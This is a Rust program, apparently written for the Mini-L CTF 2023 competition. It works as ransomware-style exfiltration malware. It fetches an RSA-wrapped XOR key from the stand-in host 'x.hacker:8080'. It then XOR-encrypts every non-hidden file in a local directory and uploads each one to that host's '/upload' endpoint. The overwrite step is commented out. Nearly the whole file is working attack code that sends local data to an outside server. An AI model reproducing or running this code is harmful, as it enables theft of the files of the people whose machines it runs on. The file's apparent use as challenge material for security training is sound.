mod util;

use std::path::PathBuf;
use std::fs;
use std::io::Read;
use hyper::{Request, Response, StatusCode};
// use rsa::pkcs8::der::Writer;
use rsa::{RsaPrivateKey, RsaPublicKey, pkcs8::{EncodePublicKey, LineEnding}, Pkcs1v15Encrypt};
use bytes::Bytes;
use util::{empty, full}; 
use tokio::net::TcpStream;
use hyper::body::Incoming;
use http_body_util::combinators::BoxBody;
use http_body_util::BodyExt;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    if let Ok((mut res, private_key)) = get_key().await {
        if res.status() == StatusCode::OK {
            let mut enc = Vec::new();
            while let Some(next) = res.frame().await {
                let frame = next?;
                if let Some(chunk) = frame.data_ref() {
                    enc.append(&mut chunk.to_vec());
                }
            }
            // println!("{:?}", enc);
            let key = private_key.decrypt(Pkcs1v15Encrypt, &enc).unwrap();
            // println!("key: {:?}", String::from_utf8_lossy(&key).to_string());
            encrypt(&key, key.len()).await?;
        }
    }
    Ok(())
}

async fn encrypt(key: &[u8], key_len: usize) -> Result<(), Box<dyn std::error::Error + Send + Sync>>  {
    let path = PathBuf::from("./dangerous_directory");
    if path.is_dir() {
        for entry in fs::read_dir(path).unwrap() {
            let entry = entry.unwrap();
            // println!("{:?}", entry.file_name());
            if entry.file_name().to_str().unwrap().starts_with('.') || entry.metadata().unwrap().is_dir() {
                continue;
            }
            let mut file_read = fs::OpenOptions::new().read(true).open(entry.path()).unwrap();
            // let mut file_write = fs::OpenOptions::new().write(true).open(entry.path()).unwrap();
            let mut buf = [0; 1024];
            let mut buf_send = Vec::new();
            while let Ok(bytes_read) = file_read.read(&mut buf) {
                // println!("read {} bytes", bytes_read);
                if bytes_read == 0 {
                    break;
                }
                for i in 0..bytes_read {
                    buf[i] ^= key[i % key_len];
                    // file_write.write_byte(buf[i]).unwrap();
                    buf_send.push(buf[i]);
                }
            }
            upload(&entry.file_name().to_str().unwrap(), full(buf_send)).await?;
        }
    }
    Ok(())
}

async fn get_key() -> Result<(Response<Incoming>, RsaPrivateKey), Box<dyn std::error::Error + Send + Sync>> {
    let url = "http://x.hacker:8080/getkey".parse::<hyper::Uri>()?;
    let host = url.host().unwrap();
    let port = url.port_u16().unwrap();
    let address = format!("{}:{}", host, port);
    // println!("{}", address);
    let stream = TcpStream::connect(address).await?;
    let (mut sender, conn) = hyper::client::conn::http1::handshake(stream).await?;
    tokio::task::spawn(async move {
        if let Err(err) = conn.await {
            println!("Connection failed: {:?}", err);
        }
    });
    let mut rng = rand::thread_rng();
    let bits = 2048;
    let private_key = RsaPrivateKey::new(&mut rng, bits).unwrap();
    let public_key = RsaPublicKey::from(&private_key);
    let pubkey = &public_key.to_public_key_pem(LineEnding::LF).unwrap();
    let pubkey = &pubkey[27..425].replace("\n", "");
    // println!("{}", pubkey);
    let req = Request::builder()
        .method("GET")
        .uri(url)
        .header("User-Agent", "Mini-L-CTF-2023")
        .header("key", pubkey)
        .body(empty())
        .unwrap();
    
    // println!("{:?}", req);
    let res = sender.send_request(req).await?;
    // println!("Response status: {}", res.status());
    Ok((res, private_key))
}

async fn upload(filename: &str, content: BoxBody<Bytes, hyper::Error>) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let url = "http://x.hacker:8080/upload".parse::<hyper::Uri>()?;
    let host = url.host().unwrap();
    let port = url.port_u16().unwrap();
    let address = format!("{}:{}", host, port);
    let stream = TcpStream::connect(address).await?;
    let (mut sender, conn) = hyper::client::conn::http1::handshake(stream).await?;
    tokio::task::spawn(async move {
        if let Err(err) = conn.await {
            println!("Connection failed: {:?}", err);
        }
    });
    let req = Request::builder()
        .method("GET")
        .uri(url)
        .header("User-Agent", "Mini-L-CTF-2023")
        .header("filename", filename)
        .body(content)
        .unwrap();

    sender.send_request(req).await?;
    // let res = client.request(req).await?;
    Ok(())
}